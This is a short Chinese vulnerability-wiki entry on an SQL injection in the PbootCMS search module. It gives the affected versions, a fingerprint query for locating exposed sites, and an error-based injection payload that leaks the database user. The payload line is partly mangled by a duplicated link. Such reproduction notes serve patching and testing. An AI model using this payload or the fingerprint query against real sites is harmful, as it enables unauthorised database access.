---
title: "PbootCMS search SQL注入漏洞"
date: 2026-10-12 09:00:57
categories:
  - WebSecurity
  - CVE
  - "cms"
  - "PbootCMS"
tags:
  - "PbootCMS"
  - "SQL注入"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

PbootCMS 搜索模块存在SQL注入漏洞。通过漏洞可获取数据库敏感信息

## 漏洞影响

```
PbootCMS < 1.2.1
```

## 网络测绘 

```
app="PBOOTCMS"
```

## 漏洞复现

搜索框页面为

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202170924485.png)Payload为

```plain
/index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,user(),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,user(),0x7e),1));%23=123)
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202170924075.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/cms/PbootCMS-search-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
